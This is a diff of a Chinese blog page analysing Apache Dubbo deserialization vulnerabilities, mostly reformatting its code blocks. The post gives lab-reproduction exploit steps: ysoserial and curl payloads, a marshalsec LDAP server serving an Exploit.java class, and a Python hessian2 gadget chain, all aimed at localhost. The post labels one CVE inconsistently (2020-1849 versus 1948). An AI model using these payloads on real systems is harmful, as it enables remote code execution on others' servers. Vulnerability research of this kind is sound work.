@@ -5,19 +5,19 @@
 <meta property="og:site_name" content="Tyaoo&#39;s Blog">
 <meta property="og:description" content="分析一下CVE-2019-17564和CVE-2020-1849两个漏洞">
 <meta property="og:locale">
-<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
+<meta property="og:image" content="https://tyaoo.github.io/img/banner.jpg">
 <meta property="article:published_time" content="2021-06-30T05:12:31.000Z">
 <meta property="article:modified_time" content="2021-08-02T02:39:44.078Z">
 <meta property="article:author" content="Tyaoo">
 <meta property="article:tag" content="漏洞分析">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://tyaoo.github.io/2021/06/30/Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+<meta name="twitter:image" content="https://tyaoo.github.io/img/banner.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://tyaoo.github.io/2021/06/30/Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
   root: '/',
   algolia: undefined,
   localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
   translate: undefined,
   noticeOutdate: undefined,
-  highlight: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
   copy: {
     success: 'Copy successfully',
     error: 'Copy error',
@@ -143,7 +143,7 @@
     }
     detectApple()
     })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="Tyaoo's Blog" type="application/atom+xml">
-</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">35</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Tyaoo's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Dubbo反序列化漏洞研究</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-06-30T05:12:31.000Z" title="Created 2021-06-30 13:12:31">2021-06-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-08-02T02:39:44.078Z" title="Updated 2021-08-02 10:39:44">2021-08-02</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Dubbo反序列化漏洞研究"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">35</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/banner.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Tyaoo's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Dubbo反序列化漏洞研究</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-06-30T05:12:31.000Z" title="Created 2021-06-30 13:12:31">2021-06-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-08-02T02:39:44.078Z" title="Updated 2021-08-02 10:39:44">2021-08-02</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Dubbo反序列化漏洞研究"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
 <p>分析一下CVE-2019-17564和CVE-2020-1849两个漏洞</p>
 </blockquote>
 <span id="more"></span>
@@ -171,57 +171,46 @@
 <p><strong>Dubbo架构</strong></p>
 <p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202106041245d4e3b0875ec74b326202.jpeg" alt="dubbo-architucture"></p>
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>安装<code>zookeeper</code></p>
-<pre><code class="cmd"># 从官网https://zookeeper.apache.org/releases.html下载
-# 将conf目录下的配置文件zoo_sample.cfg修改为zoo.cfg
-# 并且修改或添加配置文件中的dataDir和dadaLogDir地址
-# 运行bin目录下的zkServer启动zookeeper服务
-sudo ./zkServer.sh start</code></pre>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 从官网https://zookeeper.apache.org/releases.html下载</span><br><span class="line"># 将conf目录下的配置文件zoo_sample.cfg修改为zoo.cfg</span><br><span class="line"># 并且修改或添加配置文件中的dataDir和dadaLogDir地址</span><br><span class="line"># 运行bin目录下的zkServer启动zookeeper服务</span><br><span class="line">sudo ./zkServer.sh <span class="built_in">start</span></span><br></pre></td></tr></table></figure>
+
 <p>或者用docker安装</p>
-<pre><code class="cmd">docker run --rm --name zookeeper -p 2181:2181 zookeeper</code></pre>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">docker run --rm --name zookeeper -p <span class="number">2181</span>:<span class="number">2181</span> zookeeper</span><br></pre></td></tr></table></figure>
+
 <p>安装<code>dubbo-samples/dubbo-samples-http</code></p>
-<pre><code class="cmd">git clone https://github.com/apache/dubbo-samples.git
-# 使用dubbo-samples-http模块
-# 把resources/spring/http-provider.xml里面的端口修改为8081（8080容易起冲突）</code></pre>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/apache/dubbo-samples.git</span><br><span class="line"># 使用dubbo-samples-http模块</span><br><span class="line"># 把resources/spring/http-provider.xml里面的端口修改为<span class="number">8081</span>（<span class="number">8080</span>容易起冲突）</span><br></pre></td></tr></table></figure>
+
 <blockquote>
 <p>master分支的dubbo-samples只能导入<strong>2.7.6</strong>及其以上版本的dubbo，低于这个版本的会抛出以下错误</p>
-<pre><code>Cannot resolve org.apache.dubbo:dubbo:unknown</code></pre><p>解决方法是下载<strong>2.6.x</strong>分支的<strong>dubbo-samples</strong></p>
-<pre><code>git checkout 2.6.x</code></pre></blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cannot resolve org.apache.dubbo:dubbo:unknown</span><br></pre></td></tr></table></figure>
+
+<p>解决方法是下载<strong>2.6.x</strong>分支的<strong>dubbo-samples</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git checkout 2.6.x</span><br></pre></td></tr></table></figure>
+</blockquote>
 <h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><blockquote>
 <p>推荐使用此方法</p>
 </blockquote>
 <p>安装<code>dubbo-spring-boot-project</code></p>
-<pre><code class="cmd">git clone https://github.com/apache/dubbo-spring-boot-project.git
-cd dubbo-spring-boot-project
-git checkout 2.7.6</code></pre>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/apache/dubbo-spring-boot-project.git</span><br><span class="line"><span class="built_in">cd</span> dubbo-spring-boot-project</span><br><span class="line">git checkout <span class="number">2</span>.<span class="number">7</span>.<span class="number">6</span></span><br></pre></td></tr></table></figure>
+
 <h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>直接从docker中拉环境</p>
-<pre><code>docker pull dsolab/dubbo:cve-2020-1948
-docker run -p 12345:12345 dsolab/dubbo:cve-2020-1948 -d</code></pre><h2 id="JNDI工具"><a href="#JNDI工具" class="headerlink" title="JNDI工具"></a>JNDI工具</h2><h3 id="工具一"><a href="#工具一" class="headerlink" title="工具一"></a>工具一</h3><p><a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull dsolab/dubbo:cve-2020-1948</span><br><span class="line">docker run -p 12345:12345 dsolab/dubbo:cve-2020-1948 -d</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="JNDI工具"><a href="#JNDI工具" class="headerlink" title="JNDI工具"></a>JNDI工具</h2><h3 id="工具一"><a href="#工具一" class="headerlink" title="工具一"></a>工具一</h3><p><a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a></p>
 <blockquote>
 <p>我看大家都在用，但是我觉得不好用，服务冗余，而且端口每次更改都要重新编译</p>
 </blockquote>
-<pre><code class="cmd">git clone https://github.com/welk1n/JNDI-Injection-Exploit.git
-cd JNDI-Injection-Exploit
-mvn clean package -DskipTests
-# 保证1099, 1389, 8180未被使用，或者自己修改端口
-java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;open /Applications/Calculator.app&quot; -A &quot;127.0.0.1&quot;</code></pre>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/welk1n/JNDI-Injection-Exploit.git</span><br><span class="line"><span class="built_in">cd</span> JNDI-Injection-Exploit</span><br><span class="line">mvn clean package -DskipTests</span><br><span class="line"># 保证<span class="number">1099</span>, <span class="number">1389</span>, <span class="number">8180</span>未被使用，或者自己修改端口</span><br><span class="line">java -jar JNDI-Injection-Exploit-<span class="number">1</span>.<span class="number">0</span>-SNAPSHOT-all.jar -C &quot;open /Applications/Calculator.app&quot; -A &quot;<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>&quot;</span><br></pre></td></tr></table></figure>
+
 <h3 id="工具二"><a href="#工具二" class="headerlink" title="工具二"></a>工具二</h3><p><a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">marshalsec</a></p>
 <blockquote>
 <p>推荐使用此方法</p>
 </blockquote>
-<pre><code class="java">// Exploit.java
-public class Exploit &#123;
-    public Exploit()&#123;
-        try &#123;
-            // java.lang.Runtime.getRuntime().exec(&quot;touch /tmp/success&quot;);
-            java.lang.Runtime.getRuntime().exec(new String[]&#123;&quot;calc&quot;&#125;);
-        &#125; catch (java.io.IOException e) &#123;
-            e.printStackTrace();
-        &#125;
-    &#125;
-&#125;</code></pre>
-<pre><code class="cmd">javac Exploit.java
-python -m http.server 8000
-java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#Exploit 1389</code></pre>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Exploit.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// java.lang.Runtime.getRuntime().exec(&quot;touch /tmp/success&quot;);</span></span><br><span class="line">            java.lang.Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">javac Exploit.java</span><br><span class="line">python -m http.server <span class="number">8000</span></span><br><span class="line">java -cp marshalsec-<span class="number">0</span>.<span class="number">0</span>.<span class="number">3</span>-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">8000</span>/#Exploit <span class="number">1389</span></span><br></pre></td></tr></table></figure>
+
 <blockquote>
 <p>这里注意<code>http://127.0.0.1:8000/#Exploit</code>不要写成<code>http://127.0.0.1:8000#Exploit</code></p>
 </blockquote>
@@ -231,67 +220,17 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://
 <p>Apache Dubbo = 2.5.x</p>
 </blockquote>
 <p><strong>添加依赖</strong></p>
-<pre><code class="xml">&lt;dependency&gt;            
-    &lt;groupId&gt;commons-collections&lt;/groupId&gt;            
-    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;            
-    &lt;version&gt;3.1&lt;/version&gt;
-&lt;/dependency&gt;</code></pre>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>            </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>            </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>            </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p><strong>漏洞利用</strong></p>
-<pre><code class="cmd">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 calc &gt; payload.out
-curl http://127.0.0.1:8081/org.apache.dubbo.samples.http.api.DemoService --data-binary @payload.out</code></pre>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-<span class="number">0</span>.<span class="number">0</span>.<span class="number">6</span>-SNAPSHOT-all.jar CommonsCollections5 calc &gt; payload.out</span><br><span class="line">curl http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">8081</span>/org.apache.dubbo.samples.http.api.DemoService --data-binary @payload.out</span><br></pre></td></tr></table></figure>
+
 <p><strong>漏洞分析</strong></p>
-<pre><code class="java">public class HttpInvokerServiceExporter extends RemoteInvocationSerializingExporter implements HttpRequestHandler &#123;
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpInvokerServiceExporter</span> <span class="keyword">extends</span> <span class="title class_">RemoteInvocationSerializingExporter</span> <span class="keyword">implements</span> <span class="title class_">HttpRequestHandler</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleRequest</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">RemoteInvocation</span> <span class="variable">invocation</span> <span class="operator">=</span> <span class="built_in">this</span>.readRemoteInvocation(request); <span class="comment">// 处理requests内容</span></span><br><span class="line">            <span class="type">RemoteInvocationResult</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.invokeAndCreateResult(invocation, <span class="built_in">this</span>.getProxy());</span><br><span class="line">            <span class="built_in">this</span>.writeRemoteInvocationResult(request, response, result);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NestedServletException</span>(<span class="string">&quot;Class not found during deserialization&quot;</span>, var5);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">protected</span> RemoteInvocation <span class="title function_">readRemoteInvocation</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.readRemoteInvocation(request, request.getInputStream()); <span class="comment">// 获取requests的输入</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> RemoteInvocation <span class="title function_">readRemoteInvocation</span><span class="params">(HttpServletRequest request, InputStream is)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="built_in">this</span>.createObjectInputStream(<span class="built_in">this</span>.decorateInputStream(request, is));</span><br><span class="line"></span><br><span class="line">        RemoteInvocation var4;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var4 = <span class="built_in">this</span>.doReadRemoteInvocation(ois); <span class="comment">// 跟进输入处理</span></span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            ois.close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var4;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> RemoteInvocation <span class="title function_">readRemoteInvocation</span><span class="params">(HttpServletRequest request, InputStream is)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="built_in">this</span>.createObjectInputStream(<span class="built_in">this</span>.decorateInputStream(request, is));</span><br><span class="line"></span><br><span class="line">        RemoteInvocation var4;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var4 = <span class="built_in">this</span>.doReadRemoteInvocation(ois); <span class="comment">// 进入远程调用</span></span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            ois.close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var4;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
-    public void handleRequest(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;
-        try &#123;
-            RemoteInvocation invocation = this.readRemoteInvocation(request); // 处理requests内容
-            RemoteInvocationResult result = this.invokeAndCreateResult(invocation, this.getProxy());
-            this.writeRemoteInvocationResult(request, response, result);
-        &#125; catch (ClassNotFoundException var5) &#123;
-            throw new NestedServletException(&quot;Class not found during deserialization&quot;, var5);
-        &#125;
-    &#125;
-
-        protected RemoteInvocation readRemoteInvocation(HttpServletRequest request) throws IOException, ClassNotFoundException &#123;
-        return this.readRemoteInvocation(request, request.getInputStream()); // 获取requests的输入
-    &#125;
-
-    protected RemoteInvocation readRemoteInvocation(HttpServletRequest request, InputStream is) throws IOException, ClassNotFoundException &#123;
-        ObjectInputStream ois = this.createObjectInputStream(this.decorateInputStream(request, is));
-
-        RemoteInvocation var4;
-        try &#123;
-            var4 = this.doReadRemoteInvocation(ois); // 跟进输入处理
-        &#125; finally &#123;
-            ois.close();
-        &#125;
-
-        return var4;
-    &#125;
-
-    protected RemoteInvocation readRemoteInvocation(HttpServletRequest request, InputStream is) throws IOException, ClassNotFoundException &#123;
-        ObjectInputStream ois = this.createObjectInputStream(this.decorateInputStream(request, is));
-
-        RemoteInvocation var4;
-        try &#123;
-            var4 = this.doReadRemoteInvocation(ois); // 进入远程调用
-        &#125; finally &#123;
-            ois.close();
-        &#125;
-
-        return var4;
-    &#125;</code></pre>
 <p>跟进<code>doReadRemoteInvocation()</code>函数</p>
-<pre><code class="java">public abstract class RemoteInvocationSerializingExporter extends RemoteInvocationBasedExporter implements InitializingBean &#123;
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">RemoteInvocationSerializingExporter</span> <span class="keyword">extends</span> <span class="title class_">RemoteInvocationBasedExporter</span> <span class="keyword">implements</span> <span class="title class_">InitializingBean</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> RemoteInvocation <span class="title function_">doReadRemoteInvocation</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject(); <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="keyword">if</span> (!(obj <span class="keyword">instanceof</span> RemoteInvocation)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RemoteException</span>(<span class="string">&quot;Deserialized object needs to be assignable to type [&quot;</span> + RemoteInvocation.class.getName() + <span class="string">&quot;]: &quot;</span> + ClassUtils.getDescriptiveType(obj));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (RemoteInvocation)obj;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
-    protected RemoteInvocation doReadRemoteInvocation(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;
-        Object obj = ois.readObject(); // 反序列化
-        if (!(obj instanceof RemoteInvocation)) &#123;
-            throw new RemoteException(&quot;Deserialized object needs to be assignable to type [&quot; + RemoteInvocation.class.getName() + &quot;]: &quot; + ClassUtils.getDescriptiveType(obj));
-        &#125; else &#123;
-            return (RemoteInvocation)obj;
-        &#125;
-    &#125;</code></pre>
 <p><strong>patch</strong></p>
 <blockquote>
 <p><a target="_blank" rel="noopener" href="https://github.com/apache/dubbo/compare/dubbo-2.7.3...dubbo-2.7.4#diff-96ea3c598a0fa6d0ad3f028e676b17525d256692f9995f922267f83294dc04edR79">https://github.com/apache/dubbo/compare/dubbo-2.7.3...dubbo-2.7.4#diff-96ea3c598a0fa6d0ad3f028e676b17525d256692f9995f922267f83294dc04edR79</a></p>
@@ -306,12 +245,8 @@ curl http://127.0.0.1:8081/org.apache.dubbo.samples.http.api.DemoService --data-
 <blockquote>
 <p>在dubbo-spring-boot-project\dubbo-spring-boot-samples\dubbo-registry-nacos-samples\provider-sample\pom.xml处添加</p>
 </blockquote>
-<pre><code class="xml">&lt;dependency&gt;
-    &lt;groupId&gt;com.rometools&lt;/groupId&gt;
-    &lt;artifactId&gt;rome&lt;/artifactId&gt;
-    &lt;version&gt;1.7.0&lt;/version&gt;
-    &lt;scope&gt;compile&lt;/scope&gt;
-&lt;/dependency&gt;</code></pre>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.rometools<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
 <blockquote>
 <p>网上很多的分析文章直接把python版本和Java版本的混为一谈，整得我复现的时候一直出不来，后来才看到一篇文章说出了它们的区别，那些乱写的漏洞分析文章真是害人不浅…</p>
 </blockquote>
@@ -319,312 +254,56 @@ curl http://127.0.0.1:8081/org.apache.dubbo.samples.http.api.DemoService --data-
 <blockquote>
 <p>适用于2.7.5之前的版本</p>
 </blockquote>
-<pre><code class="python">from dubbo.codec.hessian2 import new_object
-from dubbo.client import DubboClient
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> dubbo.codec.hessian2 <span class="keyword">import</span> new_object</span><br><span class="line"><span class="keyword">from</span> dubbo.client <span class="keyword">import</span> DubboClient</span><br><span class="line"></span><br><span class="line">client = DubboClient(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">12345</span>)</span><br><span class="line"></span><br><span class="line">JdbcRowSetImpl=new_object(</span><br><span class="line">      <span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span>,</span><br><span class="line">      dataSource=<span class="string">&quot;ldap://127.0.0.1:8087/Exploit&quot;</span>,</span><br><span class="line">      strMatchColumns=[<span class="string">&quot;foo&quot;</span>]</span><br><span class="line">      )</span><br><span class="line">JdbcRowSetImplClass=new_object(</span><br><span class="line">      <span class="string">&#x27;java.lang.Class&#x27;</span>,</span><br><span class="line">      name=<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">      )</span><br><span class="line">toStringBean=new_object(</span><br><span class="line">      <span class="string">&#x27;com.rometools.rome.feed.impl.ToStringBean&#x27;</span>,</span><br><span class="line">      beanClass=JdbcRowSetImplClass,</span><br><span class="line">      obj=JdbcRowSetImpl</span><br><span class="line">      )</span><br><span class="line"></span><br><span class="line">resp = client.send_request_and_return_response(</span><br><span class="line">    service_name=<span class="string">&#x27;com.example.provider.service.UesrService&#x27;</span>,</span><br><span class="line">    method_name=<span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    args=[toStringBean])</span><br></pre></td></tr></table></figure>
 
-client = DubboClient(&#39;127.0.0.1&#39;, 12345)
-
-JdbcRowSetImpl=new_object(
-      &#39;com.sun.rowset.JdbcRowSetImpl&#39;,
-      dataSource=&quot;ldap://127.0.0.1:8087/Exploit&quot;,
-      strMatchColumns=[&quot;foo&quot;]
-      )
-JdbcRowSetImplClass=new_object(
-      &#39;java.lang.Class&#39;,
-      name=&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
-      )
-toStringBean=new_object(
-      &#39;com.rometools.rome.feed.impl.ToStringBean&#39;,
-      beanClass=JdbcRowSetImplClass,
-      obj=JdbcRowSetImpl
-      )
-
-resp = client.send_request_and_return_response(
-    service_name=&#39;com.example.provider.service.UesrService&#39;,
-    method_name=&#39;test&#39;,
-    args=[toStringBean])</code></pre>
 <p><strong>漏洞分析</strong></p>
 <p>漏洞链如下</p>
 <img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202106060011e9cbacf02b8aef2d57be.png" alt="image-20210605225549613" style="zoom:80%;" />
 
 <p>入口点在<code>DecodeHandler</code>类的<code>received</code>方法</p>
-<pre><code class="java">public class DecodeHandler extends AbstractChannelHandlerDelegate &#123;
